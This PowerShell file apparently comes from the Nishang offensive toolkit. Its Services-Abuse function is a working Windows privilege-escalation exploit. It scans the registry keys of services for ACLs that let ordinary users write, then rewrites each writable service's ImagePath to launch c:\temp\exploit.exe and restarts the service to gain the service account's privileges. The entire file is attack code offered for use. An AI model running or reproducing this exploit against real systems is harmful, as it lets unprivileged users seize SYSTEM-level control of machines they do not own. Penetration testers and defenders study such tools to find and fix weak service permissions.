function Services-Abuse {
<#
.SYNOPSIS
Nishang Payload which identify several vulnerabilities in windows services and exploit them in order to PE from regular user to more privileged user.

.DESCRIPTION
This payload implement most of the techniques described in MWR paper (see RELATED LINKS)
Currently only "Insecure Registry Permissions" is implemented (more will be added soon).

.EXAMPLE
PS > Services-Abuse

Use above to execute the function.

.LINK
https://labs.mwrinfosecurity.com/system/assets/760/original/Windows_Services_-_All_roads_lead_to_SYSTEM.pdf
https://github.com/samratashok/nishang
#>
    [CmdletBinding()]
    Param ()

	# Global Params for 'can_write_reg_by_acl' function
	$RegistryWrite = 'FullControl' , 'WriteKey', 'SetValue'
	$RegistryTakeOwnerShip = 'TakeOwnership'
	$RegistryChangePermissions = 'ChangePermissions'
	
	$CurrentUser = whoami # "$env:userdomain\$env:username"
	$AuthenticatedArray = $CurrentUser , 'Everyone' , 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'

	function can_write_reg_by_acl([string] $reg) {

		$Return_Status = $false;

		write-host "Check permission(ACL) for: '$reg'"

		try {
			$acl = get-acl -Path $reg -ErrorAction "Stop"
		} catch {
			write-host "Exception: " $_.Exception.GetType().FullName -ForegroundColor Red
			write-host "Message: " $_.Exception.Message -ForegroundColor Red

			return $Return_Status;
		}
		
		$acl.Access | ForEach-Object {
		
			$accessControl = $_.AccessControlType.ToString().Trim().ToLower()
			$identity = $_.identityReference.Value.Trim()
			$perm = $_.RegistryRights.ToString().Trim()
			
			write-verbose "identity => $identity | permission => $perm | accessControl => $accessControl"
			#todo: take into account deny accesscontrol rules!
			if($accessControl -eq 'allow' -and 
				$AuthenticatedArray -contains $identity) {
				
				$ModifyPerm = $false
				$TakeOwnerShipPerm = $false
				$ChangePermissionsPerm = $false
			
				$permPart = $perm.split(',');
				if($permPart.count -gt 1) {
					foreach($p in $permPart) {
						$pValue = $p.Trim()
						if($RegistryWrite -contains $pValue) {
							$ModifyPerm = $true
							break;
						} elseif($pValue -eq $RegistryTakeOwnerShip) {
							$TakeOwnerShipPerm = $true
						} elseif($pValue -eq $RegistryChangePermissions) {
							$ChangePermissionsPerm = $true
						}
					}
				} else {
					$ModifyPerm = $RegistryWrite -contains $perm
					if($perm -eq $RegistryTakeOwnerShip) {
						$TakeOwnerShipPerm = $true
					} elseif($perm -eq $RegistryChangePermissions) {
						$ChangePermissionsPerm = $true
					}
				}
				
				if($ModifyPerm) {
					$Return_Status = $true;
					Write-Host -foregroundColor Green "is writeable by permission: '$perm' to identity: '$identity'"
				} elseif($ChangePermissionsPerm) {
					Write-Host -foregroundColor Green "can change permission by permission: '$perm' to identity: '$identity'"
					#todo: change permissions!
				} elseif($TakeOwnerShipPerm) {
					Write-Host -foregroundColor Green "can take ownership by permission: '$perm' to identity: '$identity'"
					#todo: take ownership!
				}
			}
		}
		return $Return_Status;
	}
	
	$RegServicesPath = 'HKLM:\System\CurrentControlSet\services'
	try {
		$RegisteryServices = Get-ChildItem $RegServicesPath -ErrorAction "Stop"
	} catch {
		write-host "Failed to retrieve keys in:" $RegServicesPath -ForegroundColor Red
		write-host "Exception: " $_.Exception.GetType().FullName -ForegroundColor Red
		write-host "Message: " $_.Exception.Message -ForegroundColor Red
		return $false;
	}
	
	$RegisteryServicesCount = $RegisteryServices.Count
	write-host "processing" $RegisteryServicesCount "entries under $RegServicesPath"

	# todo: generate service executable content (generate_payload_exe_service in metasploit) and write it to exe file
	$ServiceExploitPath = "c:\temp\exploit.exe"
	$ServiceExploitPathString = """$ServiceExploitPath"""
	
	foreach($RegService in $RegisteryServices) {
		$RegPSPath = $RegService.PSPath
		if(can_write_reg_by_acl -reg $RegPSPath) {
		
			$RegServiceName = $RegService.PSChildName
			$ServiceImagePath = (Get-ItemProperty $RegPSPath -Name ImagePath -ErrorAction 'SilentlyContinue').ImagePath
			
			if(!($ServiceImagePath -eq $null)) {
				write-host "ImagePath of '" $RegPSPath "' exists, value is: " $ServiceImagePath
				$ServiceExploitImagePath = "$ServiceExploitPathString $ServiceImagePath"
				if($ServiceImagePath.StartsWith($ServiceExploitPathString)) {
					write-host "ImagePath startwith exploit path! aborting!"
					continue;
				}
				
				$ServiceStartName = (Get-ItemProperty $RegPSPath -Name ObjectName -ErrorAction 'SilentlyContinue').ObjectName
				$ServiceStartMode = (Get-ItemProperty $RegPSPath -Name Start -ErrorAction 'SilentlyContinue').Start
				<#
					ServiceStartMode values:
					2 = auto
					3 = manual
					4 = disabled
				#>
				$ServiceStartModeDelayed = (Get-ItemProperty $RegPSPath -Name DelayedAutoStart -ErrorAction 'SilentlyContinue').DelayedAutoStart
				# ServiceStartModeDelayed values: 1 = enabled				

				Write-Host "Service:" $RegServiceName "StartName:" $ServiceStartName "StartMode:" $ServiceStartMode "StartModeDelayed:" $ServiceStartModeDelayed
				
				try {
					Set-ItemProperty -Path $RegPSPath -Name ImagePath -Value $ServiceExploitImagePath -ErrorAction "Stop"
					Write-Host -foregroundColor Green "ImagePath of:" $RegPSPath "changed from:" $ServiceImagePath "to:" $ServiceExploitImagePath
				} catch {
					write-host "Failed to change property ImagePath of:" $RegPSPath -ForegroundColor Red
					write-host "Exception: " $_.Exception.GetType().FullName -ForegroundColor Red
					write-host "Message: " $_.Exception.Message -ForegroundColor Red
					continue;
				}
				
				try {
					Restart-Service $RegServiceName -ErrorAction 'Stop'
					Write-Host -foregroundColor Green "PE success! Service" $RegServiceName "restarted"
					Write-Host -foregroundColor Green "need to get $ServiceStartName by now :)"
				} catch {
					write-host "Failed to restart service" $RegServiceName -ForegroundColor Red
					write-host "Exception: " $_.Exception.GetType().FullName -ForegroundColor Red
					write-host "Message: " $_.Exception.Message -ForegroundColor Red
						
					#todo: check if & how can trigger the following events
					write-host "Running SC.EXE qtriggerinfo" $RegServiceName "to find out if the service has trigger events"
					SC.EXE qtriggerinfo $RegServiceName
					
					if($ServiceStartMode -eq 2) {
						Write-Host -foregroundColor Green "Service" $RegServiceName "startup mode is automatic! wait until reboot :)"
					}
				}
			} else {
					write-host "Image property not found, take a look at available properties:"
					
					Get-Item $RegPSPath | Foreach-Object {
						$_.Property | Foreach-Object {
								write-host $_ "=>" (Get-ItemProperty $RegPSPath -Name $_ -ErrorAction 'SilentlyContinue').$_
						}
					}
			}
		}
	}
}
